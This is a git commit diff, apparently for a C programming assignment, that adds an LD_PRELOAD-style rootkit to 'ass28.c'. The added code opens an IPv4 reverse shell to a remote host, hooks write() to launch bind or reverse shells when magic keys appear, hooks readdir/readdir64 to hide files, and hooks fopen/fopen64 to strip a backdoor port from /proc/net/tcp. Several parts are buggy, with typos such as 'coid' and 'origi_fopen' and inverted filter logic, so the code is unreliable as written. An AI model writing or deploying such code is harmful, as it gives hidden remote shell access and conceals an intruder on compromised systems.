b2d802e9fbab5fb0af67fdd57d4ef4c7395fa633
Tony Tran <tonytranme0@hotmail.com>
2025-07-19 16:14:28 +1000

    complete ass28.c
    Requires compiling and error checking

--- HombreCAssignment/Assignment-28/ass28.c
+++ HombreCAssignment/Assignment-28/ass28.c
@@ -147,5 +147,205 @@ int ipv6_rev(void)
     return 0;
 }
 
+int ipv4_rev (coid)
+{
+    const char* host = REM_HOST4;
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(REM_PORT);
+    inet_aton(host, &addr.sin_addr);
+
+
+    struct sockaddr_in client;
+    client.sin_family = AF_INET;
+    client.sin_port = htons(LOC_PORT);
+    client.sin_addr.s_addr = INADDR_ANY;
+
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    bind(sockfd, (struct sockaddr*) &client, sizeof(client));
+
+    connect (sockfd, (struct sockaddr*) &addr,sizeof(addr));
+
+    for (int count = 0; count < 3; count++)
+    {
+        dup2(sockfd, count);
+
+    }
+
+
+    execve("/bin/sh", NULL, NULL);
+    close(sockfd);
+
+    return 0;
+}
+
+
+
+ssize_t write(int fildes, const void *buf, size_t nbytes)
+{
+    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
+    ssize_t result;
+    
+    new_write = dlsym(RTLD_NEXT, "write");
+
+
+    char *bind4 = strstr(buf, KEY_4);
+    char *bind6 = strstr(buf, KEY_6);
+    char *rev4 = strstr(buf, KEY_R_4);
+    char *rev6 =  strstr(buf, KEY_R_6);
+
+
+    if (bind4 != NULL)
+    {
+        fildes = open("/dev/null", O_WRONLY | O_APPEND);
+        result = new_write(fildes, buf, nbytes);
+        ipv4_bind();
+
+    }
+
+    else if(bind6 != NULL)
+    {
+        fildes = open("/dev/null", O_WRONLY | O_APPEND);
+        result = new_write(fildes, buf, nbytes);
+        ipv6_bind();
+    }
+
+
+    else if(rev4 != NULL)
+    {
+        fildes = open("/dev/null", O_WRONLY | O_APPEND);
+        result = new_write(fildes, buf, nbytes);
+        ipv4_rev();
+
+    }
+
+    else if(rev6 != NULL)
+    {
+        fildes = open("/dev/null", O_WRONLY | O_APPEND);
+        result = new_write(fildes, buf, nbytes);
+        ipv6_rev();
+    }
+
+    else
+    {
+        result = new_write(fildes, buf, nbytes);
+
+    
+    }
+
+    return result;
+
+
+}
+
+
+
+
+struct dirent *(*old_readdir)(DIR *dir);
+struct dirent *readdir(DIR *dirp)
+{
+    old_readdir = dlsym(RTLD_NEXT, "readdir");
+    struct dirent *dir;
+
+    while (dir = old_readdir(dirp))
+    {
+        if(strstr(dir->d_name, FILENAME)==0) break;
+
+    }
+
+    return dir;
+
+}
+
+
+
+struct dirent64 *(*old_readdir64)(DIR *dir);
+struct dirent64 *readdir64(DIR *dirp)
+{
+    old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
+    struct dirent64 *dir;
+
+    while (dir=old_readdir64(dirp))
+    {
+        if(strstr(dir->d_name, FILENAME)==0) break;
+
+    }
+    return dir;
+}
+
+
+
+
+FILE *(*orig_fopen64)(const char *pathname, const char *mode);
+FILE *fopen64(const char *pathname, const char *mode)
+{
+    orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
+
+    char *ptr_tcp = strstr(pathname, "fopen64");
+
+
+    FILE *fp;
+
+    if(ptr_tcp != NULL)
+    {
+        char line[256];
+        FILE *temp = tmpfile64();
+        fp = origi_fopen64(pathname, mode);
+        while (fgets(line, sizeof(line), fp))
+        {
+            char *listener = strstr(line, KEY_PORT);
+            if (listener != NULL)
+            {
+                continue;
+
+            }
+            else{
+                fputs(line, temp);
+
+            }
+        }
+        return temp;
+    }
+    fp = orig_fopen64(pathname,mode);
+    return fp;
+
+}
+
+
+
+
+FILE *(*orig_fopen)(const char *pathname, const char *mode);
+FILE *fopen(const char *pathname,const char *mode)
+{
+    orig_fopen = dlsym(RTLD_NEXT, "fopen");
+    char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
+
+    FILE *fp;
+
+    if(ptr_tcp != NULL)
+    {
+        char line[256];
+        FILE *temp = tmpfile();
+        fp = origi_fopen(pathname, mode);
+        while (fgets(line, sizeof(line), fp))
+        {
+            char *listener = strstr(line, KEY_PORT);
+            if(listener != NULL)
+            {
+                continue;
+            }
+            else{
+                fputs(line, temp);
+            }
+        }
+        return temp;
+    }
+
+
+
+    fp = orig_fopen(pathname, mode);
+    return fp; 
+}
 
 
